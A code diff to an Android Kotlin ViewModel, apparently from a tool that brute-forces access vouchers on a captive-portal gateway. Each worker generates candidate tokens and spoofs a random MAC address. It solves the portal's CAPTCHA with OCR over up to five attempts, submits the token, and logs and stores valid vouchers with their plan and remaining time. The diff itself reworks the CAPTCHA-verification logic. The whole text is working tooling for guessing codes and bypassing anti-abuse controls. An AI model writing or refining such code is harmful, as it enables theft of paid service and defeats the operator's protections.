@@ -347,6 +347,9 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         }
     }
 
+    // ============================================================
+    // 🟢 UPDATED runWorker() - Fixed Logic (Separates CAPTCHA Verify & Voucher Check)
+    // ============================================================
     private suspend fun runWorker(
         workerId: Int,
         sharedCounter: java.util.concurrent.atomic.AtomicInteger
@@ -362,12 +365,11 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                     
                     addLog("[Worker-$workerId] Generated testing token: '$token'. Starting verification loop...", LogType.INFO)
 
+                    // ---------- PHASE 1: Solve CAPTCHA (Up to 5 attempts) ----------
                     var verified = false
-                    var lastResult: ValidationResult? = null
                     var correctCaptcha = ""
                     var usedSessionId = ""
 
-                    // Try up to 5 times to solve the challenge (like Python)
                     for (attempt in 1..5) {
                         if (!_isProcessing.value) break
 
@@ -377,20 +379,16 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                         val newMac = networkClient.generateRandomMac()
                         val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
                         
-                        // We use the updatedUrl for this request, but DO NOT update _gatewayUrl.value
-                        // to avoid resetting the user's manual input box in the UI.
-                        
                         val freshSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
                         if (freshSessionId == null) {
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] Error: Failed to obtain a fresh Session ID from Gateway. Retrying in 2s...", LogType.ERROR)
+                            addLog("[Worker-$workerId] [Attempt $attempt/5] Error: Failed to obtain a fresh Session ID. Retrying in 2s...", LogType.ERROR)
                             delay(2000)
                             continue
                         }
                         
-                        usedSessionId = freshSessionId
                         addLog("[Worker-$workerId] [Attempt $attempt/5] Acquired fresh Session ID: '$freshSessionId'", LogType.SUCCESS)
 
-                        // b. Download a NEW CAPTCHA image using the new Session ID
+                        // b. Download a NEW CAPTCHA image
                         addLog("[Worker-$workerId] [Attempt $attempt/5] Fetching CAPTCHA image...", LogType.INFO)
                         val finalImageUrl = _imageUrlTemplate.value.replace("{sessionId}", freshSessionId)
                         val bitmap = networkClient.downloadImage(finalImageUrl)
@@ -414,21 +412,39 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                         }
 
                         val uppercaseCaptcha = cleanOcr.uppercase()
-                        correctCaptcha = uppercaseCaptcha
                         _currentCaptchaText.value = uppercaseCaptcha
                         addLog("[Worker-$workerId] [Attempt $attempt/5] OCR read CAPTCHA: '$uppercaseCaptcha'", LogType.OCR)
 
-                        // d. Verify the CAPTCHA with the server
-                        // ✅ FIXED: Using correct keys (authCode, accessCode) like Python
-                        addLog("[Worker-$workerId] [Attempt $attempt/5] Verifying challenge response with server...", LogType.INFO)
-                        
+                        // d. ✅ FIXED: Verify CAPTCHA using the CORRECT endpoint
+                        addLog("[Worker-$workerId] [Attempt $attempt/5] Verifying CAPTCHA with server...", LogType.INFO)
+                        val isCaptchaValid = networkClient.verifyCaptcha(freshSessionId, uppercaseCaptcha)
+
+                        if (isCaptchaValid) {
+                            addLog("[Worker-$workerId] [Attempt $attempt/5] ✅ CAPTCHA Verified Successfully!", LogType.SUCCESS)
+                            verified = true
+                            correctCaptcha = uppercaseCaptcha
+                            usedSessionId = freshSessionId
+                            break
+                        } else {
+                            addLog("[Worker-$workerId] [Attempt $attempt/5] ❌ CAPTCHA verification failed. Retrying...", LogType.ERROR)
+                        }
+
+                        // Delay briefly before retrying
+                        delay(1000)
+                    }
+
+                    // ---------- PHASE 2: If CAPTCHA solved, check the Voucher Token ----------
+                    if (verified) {
+                        addLog("[Worker-$workerId] ✅ Proceeding to Voucher Check for token: '$token'", LogType.INFO)
+
                         val result = networkClient.validateToken(
                             postUrl = _postUrl.value,
-                            sessionId = freshSessionId,
-                            authCode = uppercaseCaptcha,     // ✅ "authCode"
-                            accessCode = token               // ✅ "accessCode"
+                            sessionId = usedSessionId,
+                            authCode = correctCaptcha,
+                            accessCode = token
                         )
 
+                        // Log the raw server response
                         addServerResponseLog(
                             workerId = workerId,
                             token = token,
@@ -437,39 +453,19 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                             rawResponse = result.rawResponse
                         )
 
-                        lastResult = result
-
-                        // Check if challenge verification succeeded or failed
-                        val status = result.status
-                        if (status == TokenStatus.FOUND || status == TokenStatus.USED || status == TokenStatus.INVALID || status == TokenStatus.LIMITED) {
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] Challenge verification SUCCEEDED!", LogType.SUCCESS)
-                            verified = true
-                            break
-                        } else {
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] Challenge verification FAILED. Server Response: ${result.rawResponse.take(120)}", LogType.ERROR)
-                        }
-
-                        // Delay briefly before retrying
-                        delay(1000)
-                    }
-
-                    if (verified && lastResult != null) {
                         val totalChecked = sharedCounter.incrementAndGet()
                         _attemptedCount.value = totalChecked
-
-                        val result = lastResult
-                        addLog("[Worker-$workerId] Proceeds to token submission. Action completed.", LogType.INFO)
 
                         // Handle POST result with response breakdown logic
                         when (result.status) {
                             TokenStatus.FOUND -> {
                                 _validCount.value++
-                                addLog("[Worker-$workerId] SUCCESS! Valid token discovered: '$token'", LogType.SUCCESS)
+                                addLog("[Worker-$workerId] 🎉 SUCCESS! Valid voucher discovered: '$token'", LogType.SUCCESS)
                                 
-                                // Fetch balance details (plan and time remaining) using the specific session ID used for this token
-                                addLog("[Worker-$workerId] Fetching plan/time code details for session: $usedSessionId", LogType.INFO)
+                                // Fetch balance details (plan and time remaining)
+                                addLog("[Worker-$workerId] Fetching plan/time details for session: $usedSessionId", LogType.INFO)
                                 val balance = networkClient.getBalanceDetails(usedSessionId)
-                                addLog("[Worker-$workerId] Code details - Plan: ${balance.plan}, Time: ${balance.time}", LogType.SUCCESS)
+                                addLog("[Worker-$workerId] Details - Plan: ${balance.plan}, Time: ${balance.time}", LogType.SUCCESS)
 
                                 // Save to Room DB
                                 val validTokenEntity = ValidToken(
@@ -495,15 +491,15 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                             }
                             TokenStatus.ERROR -> {
                                 _errorCount.value++
-                                addLog("[Worker-$workerId] Error validating token '$token' (Network error). Raw preview: ${result.rawResponse.take(150)}", LogType.ERROR)
+                                addLog("[Worker-$workerId] Network error validating token '$token'. Raw: ${result.rawResponse.take(150)}", LogType.ERROR)
                             }
                             TokenStatus.UNKNOWN -> {
                                 _unknownCount.value++
-                                addLog("[Worker-$workerId] Validation returned UNKNOWN status. Raw preview: ${result.rawResponse.take(150)}", LogType.WARNING)
+                                addLog("[Worker-$workerId] Unknown response for '$token'. Raw: ${result.rawResponse.take(150)}", LogType.WARNING)
                             }
                         }
                     } else {
-                        addLog("[Worker-$workerId] ERROR: Challenge verification failed after 5 attempts. Token '$token' was NOT submitted.", LogType.ERROR)
+                        addLog("[Worker-$workerId] ❌ CAPTCHA solving failed after 5 attempts. Skipping token '$token'.", LogType.ERROR)
                         _errorCount.value++
                     }
 
